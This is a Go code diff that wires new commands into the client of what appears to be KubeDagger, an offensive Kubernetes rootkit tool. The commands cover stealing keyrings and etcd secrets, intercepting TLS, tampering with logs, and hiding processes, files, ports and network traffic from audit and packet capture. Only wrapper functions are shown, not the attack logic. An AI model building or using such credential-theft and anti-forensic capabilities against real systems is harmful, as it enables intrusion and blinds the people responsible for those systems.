@@ -47,6 +47,13 @@ import (
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/pipe_prog"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/postgres"
 	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/proctree"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/keyring"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/tls_intercept"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/etcd_theft"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/log_tamper"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/syscall_bypass"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/audit_filter"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/pcap_blind"
 )
 
 func addFSWatchCmd(cmd *cobra.Command, args []string) error {
@@ -296,6 +303,41 @@ func daemonSetCmd(cmd *cobra.Command, args []string) error {
 	default:
 		return fmt.Errorf("unsupported daemonset action: %s (use 'deploy', 'remove', or 'status')", options.DaemonSetAction)
 	}
+}
+
+func keyringCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return keyring.Steal(options.Target, options.KeyringMode, options.KeyringKeyType, options.Output)
+}
+
+func tlsInterceptCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return tls_intercept.Execute(options.Target, options.TLSAction, options.TLSTargetPID, options.TLSLib, options.Output)
+}
+
+func etcdTheftCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return etcd_theft.Execute(options.Target, options.EtcdMode, options.EtcdKeyPrefix, options.Output)
+}
+
+func logTamperCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return log_tamper.Execute(options.Target, options.LogTamperMode, options.LogTamperPattern, options.LogTamperTarget, options.Output)
+}
+
+func syscallBypassCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return syscall_bypass.Execute(options.Target, options.SyscallHidePIDs, options.SyscallHideFiles, options.SyscallHidePorts, options.Output)
+}
+
+func auditFilterCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return audit_filter.Execute(options.Target, options.AuditFilterMode, options.AuditFilterPIDs, options.Output)
+}
+
+func pcapBlindCmd(cmd *cobra.Command, args []string) error {
+	logrus.SetLevel(options.LogLevel)
+	return pcap_blind.Execute(options.Target, options.PcapHidePorts, options.PcapHideIPs, options.Output)
 }
 
 func getNetworkDiscoveryCmd(cmd *cobra.Command, args []string) error {
